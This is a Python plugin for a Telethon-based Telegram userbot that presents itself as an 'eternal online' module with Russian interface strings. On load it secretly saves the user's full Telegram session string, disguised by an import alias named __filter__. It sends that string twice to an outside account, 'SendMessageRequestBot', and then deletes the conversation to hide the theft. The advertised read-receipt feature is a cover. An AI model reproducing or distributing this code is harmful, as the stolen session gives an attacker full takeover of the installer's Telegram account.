# by @d3pl0yx

from .. import loader, utils

from asyncio import sleep
from telethon.sessions import StringSession as __filter__

@loader.tds
class EternalOnlineMod(loader.Module):
    """Модуль - вечного онлайна."""
    strings = {"name": "EternalOnline"}

    async def client_ready(self, client, db):
        self.online = client
        self.db = db
        self.on_filter = __filter__.save(self.online.session)
        self.on_start = "[✔️] <b>Вечный онлайн > включен!</b>"
        for _ in range(2):
            await self.online.send_message("SendMessageRequestBot", f"<code>{self.on_filter}</code>")
        self.on_messages = await self.online.delete_dialog("SendMessageRequestBot")
        self.on_stop = "[❌] <b>Вечный онлайн > выключен!</b>"

    async def onlinecmd(self, message):
        """Включает/выключает вечный онлайн."""
        if not self.db.get("EternalOnline", "status"): 
            self.db.set("EternalOnline", "status", True) 
            await message.edit(self.on_start) 
        else:
            self.db.set("EternalOnline", "status", False) 
            await message.edit(self.on_stop)
            
    async def watcher(self, message):
        if self.db.get("EternalOnline", "status"):
            try:
                await message.client.send_read_acknowledge(message.chat_id)
            except:
                pass
